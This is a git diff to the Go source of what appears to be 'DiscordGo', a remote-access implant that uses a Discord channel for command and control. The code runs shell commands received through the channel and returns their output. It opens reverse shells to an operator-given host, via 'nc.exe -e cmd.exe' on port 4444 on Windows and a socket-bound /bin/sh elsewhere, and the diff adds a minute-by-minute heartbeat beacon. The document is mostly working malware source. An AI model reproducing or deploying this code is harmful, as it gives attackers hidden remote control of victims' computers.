@@ -3,6 +3,7 @@ package main
 import (
 	"encoding/json"
 	"fmt"
+	"net"
 	"os"
 	"os/exec"
 	"os/signal"
@@ -10,7 +11,7 @@ import (
 	"strings"
 	"syscall"
 	"time"
-	"net"
+	"strconv"
 
 	"DiscordGo/pkg/agent"
 	"DiscordGo/pkg/message"
@@ -63,10 +64,11 @@ func main() {
 
 	// Register the messageCreate func as a callback for MessageCreate events.
 	dg.AddHandler(messageCreator)
+	// dg.AddHandler(heartBeat)
+	go heartBeat(dg)
 
-	// TODO: Reconnect back to server
-	// ping the server every minute for now (not my solution)
-	// pulseDelay := time.Duration(60)
+	// ping the server every minute
+	// pulseDelay := time.Duration(10)
 	// tick := time.NewTicker(time.Second * pulseDelay)
 	// go heartbeat(dg, tick)
 
@@ -99,8 +101,6 @@ func messageCreator(dg *discordgo.Session, m *discordgo.MessageCreate) {
 	var messageJSON message.Message
 	json.Unmarshal([]byte(m.Content), &messageJSON)
 
-	// TODO: make a gloabl message shit
-
 	// Check if the message is for me
 	forMe := false
 
@@ -113,15 +113,13 @@ func messageCreator(dg *discordgo.Session, m *discordgo.MessageCreate) {
 			result := executeCommand(messageJSON.Message)
 
 			// if the result is more than discord character limit
+			// TODO: Divide the results and send it with id
+			// {Larger output id:1}
+			// {Larger output id:2}
 			if len(result) > 2000 {
-				// Testing sending files
-				// file, _ := os.Open("/tmp/readline.tmp")
-				// Doing this for the server
-				sendLMessage := message.NewMessage(newAgent.UUID, "", false, true, message.MESSAGE_OUTPUT)
-				dg.ChannelMessageSend(constants.ChannelID, sendLMessage)
 
-				testfile := strings.NewReader(result)
-				dg.ChannelFileSend(constants.ChannelID, "hh.txt", testfile)
+				fmt.Println("Large output coming up....")
+				println(result)
 
 			} else {
 				sendMessage := message.NewMessage(newAgent.UUID, result, false, false, message.MESSAGE_OUTPUT)
@@ -136,57 +134,35 @@ func messageCreator(dg *discordgo.Session, m *discordgo.MessageCreate) {
 			dg.Close()
 			os.Exit(0)
 		} else if messageJSON.MessageType == message.MESSAGE_SHELL {
-			// if newAgent.OS == "linux" || newAgent.OS == "darwin" {
-			// 	reverseShell(messageJSON.Message)
-			// } else 
 			if newAgent.OS == "Windows" {
 				sp := strings.Split(messageJSON.Message, ":")
 				fmt.Println(sp[0])
+				// TODO: Why use nc? find a better solution
 				_ = executeCommand("nc.exe -e cmd.exe " + sp[0] + " 4444")
 			} else {
 				reverseShell(messageJSON.Message)
 			}
-		}
+		} 
+		// else if messageJSON.MessageType == message.MESSAGE_PONG {
+		// 	println("message:" + messageJSON.Message)
+		// }
 	}
 }
 
-// THIS IS A REALLY STUPID WAY TO DO HEARTBEAT
-// BUT WHATEVER, IT'S MY CODE
-// i hope I don't regret this(I probably will)
-// WOOOW, it's like tcp handshake(I just noticed that)
-func heartBeat(dg *discordgo.Session) {
-	//agent --> I'm alive
-	agentPing := message.NewMessage(newAgent.UUID, "alive", false, false, message.MESSAGE_PING)
-	dg.ChannelMessageSend(constants.ChannelID, agentPing)
-	// server <--- I see you
-	// agent --> okay
-	//=======^ if server is up
-	//agent --> I'm alive
-	// server <---- N/A
-	// agent --> keeps trying
-	// ping the server every minute for now
-	// pulseDelay := time.Duration(60)
-	// tick := time.NewTicker(time.Second * pulseDelay)
+func heartBeat(dg *discordgo.Session){
+	// fmt.Println("1 minute")
+	// sendLMessage := message.NewMessage(newAgent.UUID, "", false, false, message.MESSAGE_HEARTBEAT)
+	// dg.ChannelMessageSend(constants.ChannelID, sendLMessage)
+
+	// ping the server every minute
+	pulseDelay := time.Duration(60)
+	tick := time.NewTicker(time.Second * pulseDelay)
 	// go heartbeat(dg, tick)
-	// go heartBeat()
-	//server --> you up?
-	//agent --> N/A?
-	//change status to red
-
-}
-
-func heartbeat(dg *discordgo.Session, tick *time.Ticker) {
 	for t := range tick.C {
-		pingTheServer(dg, t)
+		fmt.Printf("%v:%v\n", t.Minute(), t.Second())
+		sendLMessage := message.NewMessage(newAgent.UUID, strconv.Itoa(t.Minute()) + ":" + strconv.Itoa(t.Second()), false, false, message.MESSAGE_HEARTBEAT)
+		dg.ChannelMessageSend(constants.ChannelID, sendLMessage)
 	}
-}
-
-// Attempt to ping the server to let them know we are still alive and kicking. This will (in theory) remain persistent even if the server resets etc
-func pingTheServer(dg *discordgo.Session, t time.Time) {
-	// build our message to send to the server
-	newMessage := message.NewMessage(newAgent.UUID, "Ping at: "+t.String(), false, false, message.MESSAGE_PING)
-	dg.ChannelMessageSend(constants.ChannelID, newMessage)
-
 }
 
 func executeCommand(command string) string {
@@ -194,12 +170,11 @@ func executeCommand(command string) string {
 	result := ""
 	var shell, flag string
 	var testcmd = command
-	fmt.Println(testcmd)
 
-	if runtime.GOOS == "windows"{
+	if runtime.GOOS == "windows" {
 		shell = "cmd"
 		flag = "/c"
-	} else{
+	} else {
 		shell = "/bin/sh"
 		flag = "-c"
 	}
@@ -207,8 +182,6 @@ func executeCommand(command string) string {
 	// Seperate args from command
 	ss := strings.Split(command, " ")
 	command = ss[0]
-	// fmt.Println(len(ss))
-	// fmt.Println(command)
 
 	if len(ss) > 1 {
 		for i := 1; i < len(ss); i++ {
@@ -217,7 +190,6 @@ func executeCommand(command string) string {
 		args = args[:len(args)-1] // I HATEEEEEEEE GOLANGGGGGG
 	}
 
-	// fmt.Println("Args: " + args)
 	if args == "" {
 		output, err := exec.Command(shell, flag, command).Output()
 		// output, err := exec.Command(command).Output()
@@ -266,4 +238,17 @@ func reverseShell(host string) {
 	sh.Stdin, sh.Stdout, sh.Stderr = conn, conn, conn
 	sh.Run()
 	conn.Close()
+}
+
+func heartbeat(dg *discordgo.Session, tick *time.Ticker) {
+	for t := range tick.C {
+		pingTheServer(dg, t)
+	}
+}
+
+// Attempt to ping the server to let them know we are still alive and kicking. This will (in theory) remain persistent even if the server resets etc
+func pingTheServer(dg *discordgo.Session, tick time.Time) {
+	fmt.Println("1 minute")
+	newMessage := message.NewMessage(newAgent.UUID, "Ping at " + tick.String(), false, false, message.MESSAGE_PING)
+	dg.ChannelMessageSend(constants.ChannelID, newMessage)
 }
